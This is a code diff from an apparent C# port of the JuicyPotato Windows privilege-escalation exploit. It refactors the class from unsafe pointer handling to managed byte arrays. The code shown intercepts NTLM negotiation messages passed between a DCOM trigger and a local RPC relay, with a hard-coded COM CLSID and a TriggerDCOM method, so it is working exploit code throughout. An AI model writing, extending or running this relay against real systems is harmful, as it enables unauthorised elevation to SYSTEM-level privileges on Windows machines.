@@ -11,7 +11,7 @@ using static Vanara.PInvoke.Secur32;
 
 namespace sharp_potato;
 
-public unsafe class JuicyPotato
+public class JuicyPotato
 {
     public bool EnableDebugLogging { get; set; } = false;
     public Guid CLSID { get; set; } = Guid.Parse("03ca98d6-ff5d-49b8-abc6-03dd84127020");
@@ -57,19 +57,17 @@ public unsafe class JuicyPotato
                 Console.Write($"COM> Read result: {iResult} from COM (1337 <- COM)\n");
             if (iResult > 0)
             {
-                fixed (byte* ptrReceiveBuffer = receiveBuffer)
-                    ProcessNtlmBytes(ptrReceiveBuffer, iResult);
+                var receiveBufferClone = ProcessNtlmBytes(receiveBuffer[..iResult]);
 
                 if (EnableDebugLogging)
-                    Console.Write($"COM> Adding {iResult} bytes to RPC_Queue\n");
-                queueSendRpc.Add(receiveBuffer[..iResult]);
+                    Console.Write($"COM> Adding {iResult}/{receiveBufferClone.Length} bytes to RPC_Queue\n");
+                queueSendRpc.Add(receiveBufferClone);
 
                 var buffer = queueSendCom.Take();
                 if (EnableDebugLogging)
                     Console.Write($"COM> Popped {buffer.Length} bytes from COM_Queue\n");
 
-                fixed (byte* ptrSendBuffer = buffer)
-                    ProcessNtlmBytes(ptrSendBuffer, buffer.Length);
+                buffer = ProcessNtlmBytes(buffer);
 
                 if (EnableDebugLogging)
                     Console.Write($"COM> Sending {buffer.Length} bytes to COM (1337 -> COM)\n");
@@ -154,14 +152,14 @@ public unsafe class JuicyPotato
         client.Close();
     }
 
-    private static int FindNTLMBytes(byte* bytes, int length)
+    private static int FindNTLMBytes(byte[] data)
     {
         var pattern = new byte[] {0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50};
         int pIdx = 0;
         int i;
-        for (i = 0; i < length; i++)
+        for (i = 0; i < data.Length; i++)
         {
-            if (bytes[i] == pattern[pIdx])
+            if (data[i] == pattern[pIdx])
             {
                 pIdx += 1;
                 if (pIdx == 7) return (i - 6);
@@ -175,31 +173,24 @@ public unsafe class JuicyPotato
         return -1;
     }
 
-    private int ProcessNtlmBytes(byte* bytes, int length)
+    private byte[] ProcessNtlmBytes(byte[] data)
     {
-        int ntlmLoc = FindNTLMBytes(bytes, length);
-        if (ntlmLoc == -1) return -1;
+        int ntlmLoc = FindNTLMBytes(data);
+        if (ntlmLoc == -1)
+            return data;
 
-        int messageType = bytes[ntlmLoc + 8];
+        int messageType = data[ntlmLoc + 8];
         if (EnableDebugLogging)
-            Console.Write($"[NTLM/{length}] Will handle {length - ntlmLoc} bytes starting from {ntlmLoc} (type = {messageType})\n");
+            Console.Write($"[NTLM/{data.Length}] Will handle {data.Length - ntlmLoc} bytes starting from {ntlmLoc} (type = {messageType})\n");
         switch (messageType)
         {
-            case 1:
-                Negotiator.HandleType1(bytes + ntlmLoc, length - ntlmLoc);
-                break;
-            case 2:
-                Negotiator.HandleType2(bytes + ntlmLoc, length - ntlmLoc);
-                break;
-            case 3:
-                Negotiator.HandleType3(bytes + ntlmLoc, length - ntlmLoc);
-                break;
+            case 1: return data[..ntlmLoc].Concat(Negotiator.HandleType1(data[ntlmLoc..])).ToArray();
+            case 2: return data[..ntlmLoc].Concat(Negotiator.HandleType2(data[ntlmLoc..])).ToArray();
+            case 3: return data[..ntlmLoc].Concat(Negotiator.HandleType3(data[ntlmLoc..])).ToArray();
             default:
                 Console.Out.WriteLine("Error - Unknown NTLM message type...");
-                return -1;
+                return null;
         }
-
-        return 0;
     }
 
     public void TriggerDCOM()
